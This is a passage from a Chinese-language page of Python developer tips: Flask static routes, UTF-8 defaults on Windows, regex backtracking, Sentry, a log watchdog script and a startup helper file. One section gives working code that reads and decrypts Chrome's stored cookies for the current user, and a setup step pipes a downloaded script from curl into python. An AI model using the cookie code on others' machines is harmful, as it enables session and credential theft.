<span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="vm">__name__</span><span class="p">)</span>
<span class="k">for</span> <span class="n">path</span> <span class="ow">in</span> <span class="p">[</span><span class="s1">&#39;pic&#39;</span><span class="p">,</span> <span class="s1">&#39;skin&#39;</span><span class="p">,</span> <span class="s1">&#39;images&#39;</span><span class="p">,</span> <span class="s1">&#39;更多静态目录&#39;</span><span class="p">]:</span>
    <span class="n">blueprint</span> <span class="o">=</span> <span class="n">Blueprint</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="vm">__name__</span><span class="p">,</span> <span class="n">static_url_path</span><span class="o">=</span><span class="s1">&#39;/&#39;</span><span class="o">+</span><span class="n">path</span><span class="p">,</span> <span class="n">static_folder</span><span class="o">=</span><span class="n">path</span><span class="p">)</span>
    <span class="n">app</span><span class="o">.</span><span class="n">register_blueprint</span><span class="p">(</span><span class="n">blueprint</span><span class="p">)</span>
</code></pre></div>


<hr />
<h2 id="python35-openutf-8">Python3.5 open打开文件默认使用utf-8<a class="headerlink" href="#python35-openutf-8" title="Permanent link">&para;</a></h2>
<p>Windows下open打开文件总是会使用gbk，配置环境变量如PYTHONIOENCODING都没用，就很气，难道只能每次open都保证写上encoding=&rdquo;utf-8&rdquo;嘛？当然不必</p>
<p>google搜索关键词：windows python3 change open file encoding</p>
<p>解决方案：参考：https://stackoverflow.com/questions/31469707/changing-the-locale-preferred-encoding-in-python-3-in-windows</p>
<p>添加代码：由于只有windows才需要这么处理，所以先判断操作系统</p>
<div class="codehilite"><pre><span></span><code><span class="kn">import</span> <span class="nn">sys</span>
<span class="k">if</span> <span class="n">sys</span><span class="o">.</span><span class="n">platform</span><span class="o">.</span><span class="n">startswith</span><span class="p">(</span><span class="s2">&quot;win&quot;</span><span class="p">):</span>
    <span class="kn">import</span> <span class="nn">_locale</span>
    <span class="n">_locale</span><span class="o">.</span><span class="n">_getdefaultlocale</span> <span class="o">=</span> <span class="p">(</span><span class="k">lambda</span> <span class="o">*</span><span class="n">args</span><span class="p">:</span> <span class="p">[</span><span class="s1">&#39;en_US&#39;</span><span class="p">,</span> <span class="s1">&#39;utf8&#39;</span><span class="p">])</span>
</code></pre></div>


<hr />
<h2 id="pythonurl">Python提取url 正则匹配的回溯爆炸问题<a class="headerlink" href="#pythonurl" title="Permanent link">&para;</a></h2>
<p>提取url想遇到中文字符就不算入url中，写出了这样的正则(Python)，把中文加入到最后的排除字符：</p>
<div class="codehilite"><pre><span></span><code><span class="err">_url_re = re.compile(r&#39;(?im)((?:https?://|www\d{0,3}[.]|[a-z0-9.\-]+[.][a-z]{2,4}/)(?:[^\s()&lt;&gt;，。（）]+|\([^\s()&lt;&gt;，。（）]+\))+(?:\([^\s()&lt;&gt;，。（）]+\)|[^\u4e00-\u9fa5，。（）\s`!()\[\]{};:\&#39;&quot;.,&lt;&gt;?]))&#39;)</span>
</code></pre></div>


<p>然后实际运行的时候发现网站特定页面访问特别缓慢，CPU占用高，排除许久死循环后发现是这个正则花了太长的时间</p>
<p>解决方案就是放弃使用正则来剔除中文，提取出含有中文字符的url后再做处理去掉中文字符（字节数&gt;1的）</p>
<p>现在使用的正则是：</p>
<div class="codehilite"><pre><span></span><code><span class="err">_url_re = re.compile(r&#39;(?im)((?:https?://|www\d{0,3}[.]|[a-z0-9.\-]+[.][a-z]{2,4}/)(?:[^\s()&lt;&gt;]+|\([^\s()&lt;&gt;]+\))+(?:\([^\s()&lt;&gt;]+\)|[^\s`!()\[\]{};:\&#39;&quot;.,&lt;&gt;?]))&#39;)</span>
</code></pre></div>


<p>提取后的处理代码：</p>
<div class="codehilite"><pre><span></span><code><span class="err">start, end = match.span()</span>
<span class="err">while len(data[end-1].encode(&quot;utf-8&quot;))&gt;1:</span>
<span class="err">    end -= 1</span>
</code></pre></div>


<p>现在改为更加保守的 从左往右遍历，遇到字节数&gt;1的就终止url：</p>
<div class="codehilite"><pre><span></span><code><span class="k">start</span><span class="p">,</span><span class="w"> </span><span class="k">end</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">match</span><span class="p">.</span><span class="n">span</span><span class="p">()</span><span class="w"></span>
<span class="n">newend</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">start</span><span class="w"></span>
<span class="k">while</span><span class="w"> </span><span class="n">newend</span><span class="o">&lt;</span><span class="k">end</span><span class="w"> </span><span class="ow">and</span><span class="w"> </span><span class="nf">len</span><span class="p">(</span><span class="k">data</span><span class="o">[</span><span class="n">newend</span><span class="o">]</span><span class="p">.</span><span class="n">encode</span><span class="p">(</span><span class="ss">&quot;utf-8&quot;</span><span class="p">))</span><span class="o">==</span><span class="mi">1</span><span class="err">:</span><span class="w"></span>
<span class="w">    </span><span class="n">newend</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="mi">1</span><span class="w"></span>
<span class="k">end</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">newend</span><span class="w"></span>
</code></pre></div>


<hr />
<h2 id="ubuntugmpy2">ubuntu安装gmpy2<a class="headerlink" href="#ubuntugmpy2" title="Permanent link">&para;</a></h2>
<div class="codehilite"><pre><span></span><code><span class="err">apt install libmpc-dev libmpfr-dev</span>
<span class="err">pip install gmpy2</span>
</code></pre></div>


<p>辣鸡的官方文档都不提一下apt安装依赖库的事情，apt能搞定的为啥还要自己编译hhh</p>
<p>支持python3 也可以-t .安装到当前目录，就是编译生成了一个so文件</p>
<hr />
<h2 id="flask_1">Flask模板 删去循环引入的多余空格<a class="headerlink" href="#flask_1" title="Permanent link">&para;</a></h2>
<p>在模板文件中写for循环的时候，产生的html会包含代码中的缩进空格，这可能会暴露代码的信息，所以有必要删去</p>
<p>很简单 把 <code>{% %}</code>改为 <code>{%- -%}</code>即可</p>
<div class="codehilite"><pre><span></span><code><span class="cp">{%</span>- <span class="k">for</span> <span class="nv">i</span> <span class="k">in</span> <span class="nv">range</span><span class="o">(</span><span class="m">1</span><span class="o">,</span><span class="m">10</span><span class="o">)</span> -<span class="cp">%}</span><span class="x"></span>
<span class="x">    </span><span class="cp">{{</span><span class="nv">i</span><span class="cp">}}</span><span class="x"></span>
<span class="cp">{%</span>- <span class="k">endfor</span> -<span class="cp">%}</span><span class="x"></span>
</code></pre></div>


<hr />
<h2 id="sentry">使用sentry<a class="headerlink" href="#sentry" title="Permanent link">&para;</a></h2>
<p>在py文件一开始进行加载，会自动处理没有被handle的异常</p>
<p>安装：pip install sentry_sdk</p>
<div class="codehilite"><pre><span></span><code><span class="kn">import</span> <span class="nn">sentry_sdk</span>
<span class="kn">from</span> <span class="nn">sentry_sdk</span> <span class="kn">import</span> <span class="n">capture_message</span><span class="p">,</span> <span class="n">capture_exception</span>
<span class="n">sentry_sdk</span><span class="o">.</span><span class="n">init</span><span class="p">(</span><span class="s2">&quot;....&quot;</span><span class="p">)</span>
</code></pre></div>


<p>在出现了意外但是不严重可以pass的时候 代替<code>traceback.print_exc()</code>：</p>
<div class="codehilite"><pre><span></span><code><span class="k">try</span><span class="o">:</span>
    <span class="mi">1</span><span class="o">/</span><span class="mi">0</span>
<span class="n">except</span><span class="o">:</span>
    <span class="n">capture_exception</span><span class="o">()</span>
    <span class="n">capture_message</span><span class="o">(</span><span class="s2">&quot;oho, 1/0 failed...&quot;</span><span class="o">)</span>
    <span class="n">pass</span>
</code></pre></div>


<p>如果是flask的应用 比如用户登录了，希望报错的时候顺带给出用户名：</p>
<div class="codehilite"><pre><span></span><code><span class="kn">from</span> <span class="nn">sentry_sdk</span> <span class="kn">import</span> <span class="n">configure_scope</span>
<span class="nd">@app.before_request</span>
<span class="k">def</span> <span class="nf">before_request_session</span><span class="p">():</span>
    <span class="k">if</span> <span class="s2">&quot;username&quot;</span> <span class="ow">in</span> <span class="n">session</span><span class="p">:</span>
        <span class="k">with</span> <span class="n">configure_scope</span><span class="p">()</span> <span class="k">as</span> <span class="n">scope</span><span class="p">:</span>
            <span class="n">scope</span><span class="o">.</span><span class="n">user</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&quot;username&quot;</span><span class="p">:</span> <span class="n">session</span><span class="p">[</span><span class="s2">&quot;username&quot;</span><span class="p">]}</span>
</code></pre></div>


<h3 id="sentry_1">不要过于依赖Sentry<a class="headerlink" href="#sentry_1" title="Permanent link">&para;</a></h3>
<p><code>capture_exception</code>和<code>capture_message</code> 都是同步调用 本质上是一个耗时的网络请求</p>
<p>尤其在循环中触发 会导致页面加载速度显著变慢</p>
<p>对于已经知道会有异常产生也不关心的，就不要抓住这种异常来损害性能了 pass就好了</p>
<h2 id="pysysargv">解决命令行执行py文件没有sys.argv的问题<a class="headerlink" href="#pysysargv" title="Permanent link">&para;</a></h2>
<p>这是由于打开方式没有把%*加上的原因，修改注册表 regedit</p>
<div class="codehilite"><pre><span></span><code><span class="err">HKEY_CLASSES_ROOT\Python.File\Shell\open\command</span>
</code></pre></div>


<p>末尾加上<code>%*</code>即可，例如改为</p>
<div class="codehilite"><pre><span></span><code><span class="err">&quot;C:\Python37\python.exe&quot; &quot;%1&quot; %*</span>
</code></pre></div>


<p>你也可以用管理员权限的cmd来做修改：</p>
<p>先查询.py的文件类型：<code>assoc .py</code>查到<code>.py=Python.File</code></p>
<p>然后查一下当前的运行命令：<code>ftype Python.File</code> 然后用<code>ftype Python.File="C:\Python37\python.exe" "%1" %*</code>修改即可</p>
<hr />
<h2 id="pythonwindows-chromecookie">Python获取Windows Chrome的Cookie<a class="headerlink" href="#pythonwindows-chromecookie" title="Permanent link">&para;</a></h2>
<p>参考：https://github.com/cheezone/ZhihuVAPI/blob/34ef5881f83da0026119e3167ebe727619774c7b/ZhihuVAPI/util/Session.py#L18</p>
<p>Chrome的cookie用sqlite数据库存储，用WinAPI加密，当前用户任何程序都可以调用解密API来获取cookie</p>
<div class="codehilite"><pre><span></span><code><span class="kn">import</span> <span class="nn">sqlite3</span>
<span class="kn">import</span> <span class="nn">glob</span>
<span class="kn">import</span> <span class="nn">os</span>
<span class="kn">from</span> <span class="nn">win32.win32crypt</span> <span class="kn">import</span> <span class="n">CryptUnprotectData</span>

<span class="k">def</span> <span class="nf">getcookie</span><span class="p">(</span><span class="n">host</span><span class="p">):</span>
    <span class="n">result</span> <span class="o">=</span> <span class="p">[]</span>
    <span class="k">for</span> <span class="n">cookiepath</span> <span class="ow">in</span> <span class="n">glob</span><span class="o">.</span><span class="n">glob</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">environ</span><span class="p">[</span><span class="s1">&#39;LOCALAPPDATA&#39;</span><span class="p">]</span> <span class="o">+</span> <span class="sa">r</span><span class="s2">&quot;\*\*\User Data\Default\Cookies&quot;</span><span class="p">)</span><span class="o">+</span><span class="n">glob</span><span class="o">.</span><span class="n">glob</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">environ</span><span class="p">[</span><span class="s1">&#39;LOCALAPPDATA&#39;</span><span class="p">]</span> <span class="o">+</span> <span class="sa">r</span><span class="s2">&quot;\*\User Data\Default\Cookies&quot;</span><span class="p">):</span>
        <span class="n">sql</span> <span class="o">=</span> <span class="s2">&quot;select host_key,name,encrypted_value from cookies where host_key=&#39;</span><span class="si">%s</span><span class="s2">&#39;&quot;</span> <span class="o">%</span> <span class="n">host</span>
        <span class="k">with</span> <span class="n">sqlite3</span><span class="o">.</span><span class="n">connect</span><span class="p">(</span><span class="n">cookiepath</span><span class="p">)</span> <span class="k">as</span> <span class="n">conn</span><span class="p">:</span>
            <span class="n">cu</span> <span class="o">=</span> <span class="n">conn</span><span class="o">.</span><span class="n">cursor</span><span class="p">()</span>
            <span class="n">cookies</span> <span class="o">=</span> <span class="p">{</span><span class="n">name</span><span class="p">:</span> <span class="n">CryptUnprotectData</span><span class="p">(</span><span class="n">encrypted_value</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span> <span class="k">for</span> <span class="n">host_key</span><span class="p">,</span> <span class="n">name</span><span class="p">,</span> <span class="n">encrypted_value</span> <span class="ow">in</span> <span class="n">cu</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span><span class="n">sql</span><span class="p">)</span><span class="o">.</span><span class="n">fetchall</span><span class="p">()}</span>
        <span class="n">result</span><span class="o">.</span><span class="n">extend</span><span class="p">([</span><span class="n">k</span><span class="o">+</span><span class="s2">&quot;=&quot;</span><span class="o">+</span><span class="n">v</span> <span class="k">for</span> <span class="n">k</span><span class="p">,</span> <span class="n">v</span> <span class="ow">in</span> <span class="n">cookies</span><span class="o">.</span><span class="n">items</span><span class="p">()])</span>
    <span class="k">return</span> <span class="n">result</span>
</code></pre></div>


<p>调用如<code>getcookie(".zhihu.com")</code></p>
<hr />
<h2 id="winencodingutf-8">Win开发摆脱每次都要写的encoding=utf-8<a class="headerlink" href="#winencodingutf-8" title="Permanent link">&para;</a></h2>
<p>在Windows上写代码，目标部署环境为linux，本机运行的时候不想每次读写文件都要写<code>encoding="utf-8"</code></p>
<p>修改<code>C:\Python38\Lib\site.py</code>，末尾加上：</p>
<div class="codehilite"><pre><span></span><code><span class="kn">import</span> <span class="nn">_locale</span>
<span class="n">_locale</span><span class="o">.</span><span class="n">_getdefaultlocale</span> <span class="o">=</span> <span class="p">(</span><span class="k">lambda</span> <span class="o">*</span><span class="n">args</span><span class="p">:</span> <span class="p">[</span><span class="s1">&#39;en_US&#39;</span><span class="p">,</span> <span class="s1">&#39;utf8&#39;</span><span class="p">])</span>
</code></pre></div>


<p>验证可以用：<code>python -c "print(open('x','w').encoding)"</code> 输出<code>utf8</code>而不是<code>cp936</code>即可</p>
<p>参考： https://juejin.im/post/5bd2b6d5e51d45735c3c0453</p>
<hr />
<h2 id="ubuntu1604python37">Ubuntu16.04安装Python3.7<a class="headerlink" href="#ubuntu1604python37" title="Permanent link">&para;</a></h2>
<p>并且设置为默认的python</p>
<div class="codehilite"><pre><span></span><code>    <span class="n">apt</span><span class="o">-</span><span class="n">key</span> <span class="n">adv</span> <span class="o">--</span><span class="n">keyserver</span> <span class="n">keyserver</span><span class="o">.</span><span class="n">ubuntu</span><span class="o">.</span><span class="n">com</span> <span class="o">--</span><span class="n">recv</span><span class="o">-</span><span class="n">keys</span> <span class="n">BA6932366A755776</span> <span class="o">&amp;&amp;</span>\
    <span class="n">echo</span> <span class="s2">&quot;deb http://ppa.launchpad.net/deadsnakes/ppa/ubuntu xenial main&quot;</span> <span class="o">&gt;</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">apt</span><span class="o">/</span><span class="n">sources</span><span class="o">.</span><span class="n">list</span><span class="o">.</span><span class="n">d</span><span class="o">/</span><span class="n">python</span><span class="o">.</span><span class="n">list</span> <span class="o">&amp;&amp;</span>\
    <span class="n">apt</span> <span class="n">update</span> <span class="o">&amp;&amp;</span> <span class="n">apt</span> <span class="n">install</span> <span class="o">-</span><span class="n">y</span> <span class="n">python3</span><span class="o">.</span><span class="mi">7</span><span class="o">-</span><span class="n">dev</span> <span class="o">&amp;&amp;</span>\
    <span class="n">update</span><span class="o">-</span><span class="n">alternatives</span> <span class="o">--</span><span class="n">install</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">python</span> <span class="n">python</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">python3</span><span class="o">.</span><span class="mi">7</span> <span class="mi">50</span> <span class="o">&amp;&amp;</span>\
    <span class="n">curl</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">bootstrap</span><span class="o">.</span><span class="n">pypa</span><span class="o">.</span><span class="n">io</span><span class="o">/</span><span class="n">get</span><span class="o">-</span><span class="n">pip</span><span class="o">.</span><span class="n">py</span> <span class="o">|</span> <span class="n">python</span> <span class="o">&amp;&amp;</span>\
    <span class="n">pip</span> <span class="n">install</span> <span class="o">-</span><span class="n">U</span> <span class="n">setuptools</span>
</code></pre></div>


<p>但是在ubuntu 14.04上从这个ppa源安装的python没有_ssl的库，无法使用pip很迷（解决方案就是开了一个docker ubuntu16.04的容器继续）</p>
<hr />
<h2 id="keyboardinterrupt">判断代码是否卡住，自动发送KeyboardInterrupt<a class="headerlink" href="#keyboardinterrupt" title="Permanent link">&para;</a></h2>
<p>场景： 跑爬虫等依赖网络的代码，遇到网络不佳的时候一直卡住不再执行，增加timeout设置确实是一种方法，有没有不用改代码的方式呢？</p>
<p>依赖： <code>apt install inotify-tools</code></p>
<p>watch.sh:</p>
<div class="codehilite"><pre><span></span><code><span class="ch">#!/bin/bash</span>
<span class="k">while</span> true<span class="p">;</span> <span class="k">do</span>
    inotifywait -e modify -t <span class="m">100</span> <span class="nv">$1</span>
    <span class="nv">res</span><span class="o">=</span><span class="nv">$?</span>
    <span class="k">if</span> <span class="o">[</span> <span class="s2">&quot;</span><span class="nv">$res</span><span class="s2">&quot;</span> <span class="o">==</span> <span class="s2">&quot;2&quot;</span> <span class="o">]</span><span class="p">;</span> <span class="k">then</span>
        <span class="nb">echo</span> <span class="s2">&quot;[`date`] Time Out!&quot;</span>
        <span class="nv">$2</span> <span class="o">||</span> <span class="nb">break</span>
    <span class="k">fi</span>
    sleep <span class="m">60</span>
<span class="k">done</span>
</code></pre></div>


<p>用法：</p>
<div class="codehilite"><pre><span></span><code><span class="err">python -u run.py &gt;&amp; log.txt &amp;</span>
<span class="err">ps #查看python进程的id, 假设为12345</span>
<span class="err">./watch.sh log.txt &quot;kill -SIGINT 12345&quot;</span>
</code></pre></div>


<p>解释：python指定输出流不缓存，保证最新的print也能实时写入文件中</p>
<p>然后使用inotifywait这个工具观察文件<code>$1</code>在100秒内有没有发生修改</p>
<p>如果没有修改就执行用户提供的参数<code>$2</code>，这里是使用kill发送SIGINT信号</p>
<p>在Linux里，用户按Ctrl+C就是BASH给当前前台的进程发送这个信号</p>
<p>如果进程已经结束，那么kill会报错找不到进程，这时候我们就可以break跳出循环了</p>
<p>如果发生了修改就歇一分钟后继续观察</p>
<p>这个场景下允许延迟没必要一直观察，只要卡住的时候能发现即可（最迟160秒）</p>
<p>当然爬虫代码需要处理异常，失败的时候继续下一次爬取或者重试即可</p>
<hr />
<h2 id="pythonstartup-pythonimport">设置PYTHONSTARTUP环境变量 启动Python自动执行一些import<a class="headerlink" href="#pythonstartup-pythonimport" title="Permanent link">&para;</a></h2>
<p>经常启动Python当计算器用，但有些时候也需要执行quote之类的函数，每次都要手动import就很烦</p>
<p>所以可以配置一个环境变量来让启动Python时自动执行这些import操作</p>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>注意这个不会改变Python执行.py文件的行为，只在Python Interpreter中生效</p>
</div>
<p>Windows在cmd里可以用setx设置环境变量，或者你也可以编辑注册表 <code>HKEY_CURRENT_USER\Environment</code></p>
<p>参考： http://www.dowdandassociates.com/blog/content/howto-set-an-environment-variable-in-windows-command-line-and-registry/</p>
<div class="codehilite"><pre><span></span><code><span class="n">setx</span> <span class="n">PYTHONSTARTUP</span> <span class="n">d</span><span class="p">:</span>\<span class="n">myshell</span>\<span class="n">pyload</span><span class="o">.</span><span class="n">py</span>
</code></pre></div>


<p>这个脚本需要快速加载，避免启动Python太慢，所以使用lazyload来把真正的import留到使用时：</p>
<p>依赖： PYTHONUTF8=1使得windows的python读写文件默认也使用UTF8</p>
<div class="codehilite"><pre><span></span><code><span class="err">set PYTHONUTF8=1</span>
<span class="err">pip install lazy_import</span>
</code></pre></div>


<p>先简要概括一下这个脚本提供了些啥：</p>
<div class="codehilite"><pre><span></span><code><span class="err">标准库：</span><span class="n">time</span><span class="p">,</span> <span class="n">sys</span><span class="p">,</span> <span class="n">os</span><span class="p">,</span> <span class="n">json</span><span class="p">,</span> <span class="n">pickle</span><span class="p">,</span> <span class="n">csv</span><span class="p">,</span> <span class="n">requests</span><span class="p">,</span> <span class="n">np</span><span class="p">(</span><span class="n">numpy</span><span class="p">),</span> <span class="n">plt</span><span class="p">(</span><span class="n">matplotlib</span><span class="o">.</span><span class="n">pyplot</span><span class="p">)</span>
<span class="err">对象：</span><span class="n">a是EasyLogin</span><span class="p">(),</span> <span class="n">sess是requests</span><span class="o">.</span><span class="n">session</span><span class="p">()</span>
<span class="err">函数：</span> 
    <span class="n">pload</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="n">default</span><span class="p">)</span> <span class="err">载入一个</span><span class="n">pickle文件</span>
    <span class="n">pdump</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span> <span class="err">将</span><span class="n">data写入pickle文件</span>
    <span class="n">jload</span> <span class="err">用</span><span class="n">json读取文件</span>
    <span class="n">jload</span> <span class="err">用</span><span class="n">json写入文件</span>
    <span class="n">bd</span><span class="p">(</span><span class="n">b64_string</span><span class="p">)</span> <span class="err">解码</span><span class="n">base64字符串</span><span class="err">，返回</span><span class="nb">str</span><span class="err">，自动补齐等号，不会</span><span class="n">Invalid</span> <span class="n">base64</span><span class="o">-</span><span class="n">encoded</span> <span class="n">string</span>
    <span class="n">hd</span><span class="p">(</span><span class="n">b16_string</span><span class="p">)</span> <span class="n">hex</span> <span class="n">decode</span> <span class="err">将</span><span class="n">hex字符串转为bytes</span>
    <span class="n">myprint</span> <span class="err">显示当前时间的</span><span class="nb">print</span>
    <span class="n">md5</span> <span class="err">计算给定字符串的</span><span class="n">md5的32字节hex字符串</span>
    <span class="n">t</span><span class="p">()</span> <span class="nb nb-Type">int</span><span class="p">(</span><span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">())</span>
    <span class="n">d</span><span class="p">()</span> <span class="err">等价于</span><span class="n">date</span> <span class="o">-</span><span class="n">d</span><span class="err">@</span><span class="n">xxx</span><span class="err">，将</span><span class="n">timestamp转为人类可读的格式</span><span class="err">，也支持毫秒的输入</span>
<span class="err">简写：</span>
    <span class="n">jl</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">loads</span>
    <span class="n">pp</span> <span class="o">=</span> <span class="n">pprint</span><span class="o">.</span><span class="n">pprint</span>
    <span class="n">sleep</span> <span class="o">=</span> <span class="n">time</span><span class="o">.</span><span class="n">sleep</span>
    <span class="n">leval</span> <span class="o">=</span> <span class="n">ast</span><span class="o">.</span><span class="n">literal_eval</span>
</code></pre></div>


<div class="codehilite"><pre><span></span><code><span class="kn">import</span> <span class="nn">_locale</span>
<span class="n">_locale</span><span class="o">.</span><span class="n">_getdefaultlocale</span> <span class="o">=</span> <span class="p">(</span><span class="k">lambda</span> <span class="o">*</span><span class="n">args</span><span class="p">:</span> <span class="p">[</span><span class="s1">&#39;en_US&#39;</span><span class="p">,</span> <span class="s1">&#39;utf8&#39;</span><span class="p">])</span>
<span class="kn">import</span> <span class="nn">time</span>
<span class="kn">from</span> <span class="nn">time</span> <span class="kn">import</span> <span class="n">sleep</span>
<span class="kn">import</span> <span class="nn">sys</span>
<span class="kn">import</span> <span class="nn">json</span>
<span class="kn">import</span> <span class="nn">pickle</span>

<span class="k">def</span> <span class="nf">pload</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="n">default</span><span class="o">=</span><span class="kc">None</span><span class="p">,</span> <span class="n">lib</span><span class="o">=</span><span class="n">pickle</span><span class="p">):</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="n">res</span> <span class="o">=</span> <span class="n">lib</span><span class="o">.</span><span class="n">load</span><span class="p">(</span><span class="nb">open</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="s2">&quot;rb&quot;</span><span class="p">))</span>
    <span class="k">except</span><span class="p">:</span>
        <span class="k">if</span> <span class="n">default</span> <span class="ow">is</span> <span class="kc">None</span><span class="p">:</span>
            <span class="k">raise</span>
        <span class="k">return</span> <span class="n">default</span>
    <span class="k">return</span> <span class="n">res</span>

<span class="k">def</span> <span class="nf">pdump</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="n">data</span><span class="p">,</span> <span class="n">lib</span><span class="o">=</span><span class="n">pickle</span><span class="p">):</span>
    <span class="nb">open</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="s2">&quot;w&quot;</span><span class="o">+</span><span class="p">(</span><span class="s2">&quot;b&quot;</span> <span class="k">if</span> <span class="n">lib</span><span class="o">==</span><span class="n">pickle</span> <span class="k">else</span> <span class="s2">&quot;&quot;</span><span class="p">))</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">lib</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">data</span><span class="p">))</span>

<span class="k">def</span> <span class="nf">jload</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="n">default</span><span class="o">=</span><span class="kc">None</span><span class="p">):</span>
    <span class="k">return</span> <span class="n">pload</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="n">default</span><span class="o">=</span><span class="n">default</span><span class="p">,</span> <span class="n">lib</span><span class="o">=</span><span class="n">json</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">jdump</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="n">data</span><span class="p">):</span>
    <span class="k">return</span> <span class="n">pdump</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="n">data</span><span class="p">,</span> <span class="n">lib</span><span class="o">=</span><span class="n">json</span><span class="p">)</span>

<span class="kn">import</span> <span class="nn">os</span>
<span class="kn">import</span> <span class="nn">csv</span>

<span class="kn">from</span> <span class="nn">urllib.parse</span> <span class="kn">import</span> <span class="n">quote</span><span class="p">,</span> <span class="n">unquote</span>
<span class="kn">from</span> <span class="nn">base64</span> <span class="kn">import</span> <span class="n">b64encode</span><span class="p">,</span> <span class="n">b64decode</span><span class="p">,</span> <span class="n">b16encode</span><span class="p">,</span> <span class="n">b16decode</span>

<span class="k">def</span> <span class="nf">bd</span><span class="p">(</span><span class="n">b64_string</span><span class="p">):</span>
    <span class="n">b64_string</span> <span class="o">+=</span> <span class="s2">&quot;=&quot;</span> <span class="o">*</span> <span class="p">((</span><span class="mi">4</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">b64_string</span><span class="p">)</span> <span class="o">%</span> <span class="mi">4</span><span class="p">)</span> <span class="o">%</span> <span class="mi">4</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">b64decode</span><span class="p">(</span><span class="n">b64_string</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>

<span class="n">jl</span><span class="o">=</span><span class="n">json</span><span class="o">.</span><span class="n">loads</span>

<span class="k">def</span> <span class="nf">hd</span><span class="p">(</span><span class="n">b16_string</span><span class="p">):</span>
    <span class="k">return</span> <span class="n">b16decode</span><span class="p">(</span><span class="n">b16_string</span><span class="o">.</span><span class="n">upper</span><span class="p">())</span>

<span class="k">def</span> <span class="nf">myprint</span><span class="p">(</span><span class="o">*</span><span class="n">args</span><span class="p">,</span> <span class="o">**</span><span class="n">kwargs</span><span class="p">):</span>
    <span class="n">args</span> <span class="o">=</span> <span class="nb">list</span><span class="p">(</span><span class="n">args</span><span class="p">)</span>
    <span class="n">args</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="s2">&quot;[&quot;</span><span class="o">+</span><span class="n">time</span><span class="o">.</span><span class="n">strftime</span><span class="p">(</span><span class="s2">&quot;%Y-%m-</span><span class="si">%d</span><span class="s2"> %H:%M:%S&quot;</span><span class="p">)</span><span class="o">+</span><span class="s2">&quot;] &quot;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">args</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
    <span class="nb">print</span><span class="p">(</span><span class="o">*</span><span class="n">args</span><span class="p">,</span> <span class="o">**</span><span class="n">kwargs</span><span class="p">)</span>

<span class="kn">import</span> <span class="nn">lazy_import</span>
<span class="n">requests</span> <span class="o">=</span> <span class="n">lazy_import</span><span class="o">.</span><span class="n">lazy_module</span><span class="p">(</span><span class="s2">&quot;requests&quot;</span><span class="p">)</span>
<span class="n">numpy</span> <span class="o">=</span> <span class="n">np</span> <span class="o">=</span> <span class="n">lazy_import</span><span class="o">.</span><span class="n">lazy_module</span><span class="p">(</span><span class="s2">&quot;numpy&quot;</span><span class="p">)</span>
<span class="n">plt</span> <span class="o">=</span> <span class="n">lazy_import</span><span class="o">.</span><span class="n">lazy_module</span><span class="p">(</span><span class="s2">&quot;matplotlib.pyplot&quot;</span><span class="p">)</span>
<span class="n">el</span> <span class="o">=</span> <span class="n">EasyLogin</span> <span class="o">=</span> <span class="n">lazy_import</span><span class="o">.</span><span class="n">lazy_class</span><span class="p">(</span><span class="s2">&quot;EasyLogin.EasyLogin&quot;</span><span class="p">)</span>
<span class="n">pp</span> <span class="o">=</span> <span class="n">pprint</span> <span class="o">=</span> <span class="n">lazy_import</span><span class="o">.</span><span class="n">lazy_function</span><span class="p">(</span><span class="s2">&quot;pprint.pprint&quot;</span><span class="p">)</span>
<span class="n">leval</span> <span class="o">=</span> <span class="n">lazy_import</span><span class="o">.</span><span class="n">lazy_function</span><span class="p">(</span><span class="s2">&quot;ast.literal_eval&quot;</span><span class="p">)</span>

<span class="kn">import</span> <span class="nn">hashlib</span>
<span class="k">def</span> <span class="nf">_load_hashlib</span><span class="p">(</span><span class="n">name</span><span class="p">):</span>
    <span class="k">def</span> <span class="nf">f</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
        <span class="k">if</span> <span class="nb">isinstance</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="nb">str</span><span class="p">):</span>
